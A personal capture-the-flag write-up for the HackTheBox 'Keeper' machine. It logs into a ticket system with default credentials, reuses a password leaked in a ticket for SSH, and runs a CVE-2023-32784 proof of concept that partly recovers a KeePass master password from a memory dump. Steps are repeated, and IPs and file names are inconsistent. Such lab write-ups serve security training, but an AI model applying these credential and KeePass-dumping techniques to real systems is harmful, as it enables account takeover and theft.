There’s a webserver, let’s see if there are any directories using gobuster:
There are no directories showing up

The website leads us to another link, we gotta resolve the name first
echo “10.129.253.5 tickets.keeper.htb keeper.htb” | sudo tee -a /etc/hosts

I was able to login to tickets.keeper.htb, they use default credentials still
User: root
Password: password

We were able to login, and we found an open ticket about another user. In the comments of the ticket, it seems they put their initial password as: Welcome2023!

Let’s test an SSH connection now
ssh lnorgaard@10.129.89.109

While in the SSH session, let’s take the zip back to our desktop
scp lnorgaard@10.129.89.109:/home/lnorgaard/RT30000.zip  .

User flag is in the directory, but there is also a zip file “RT30000.zip”
unzip RT3000.zip

There are two files, KeePassDumpFull.dmp and passcodes.kdbx

We can use this CVE-2023-32784 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784 

We also found a github for proof of concept: https://github.com/vdohney/keepass-password-dumper 

While in the SSH session, let’s take the zip back to our desktop
scp lnorgaard@10.129.89.109:/home/lnorgaard/RT30000.zip  .

Using the github and the instructions above:
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper/


dotnet run ../KeePassDumpFull.dmp ../passcodes.kdbx 

Output: 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
16 possible passwords saved in ../passcodes.kdbx. Unknown characters indicated as ●


Now, we need something to interact with the KeePass database
sudo apt-get install kpcli -y

We ran into issues with installation as we have unmet dependencies, it requires “perlapi.5.36.0”
sudo apt-get update
sudo apt-get upgrade

The above did not work, let’s try using aptitude, it is often better at resolving dependencies than apt-get.

Nothing seems to be working, stopping here. We only got the user flag for now.
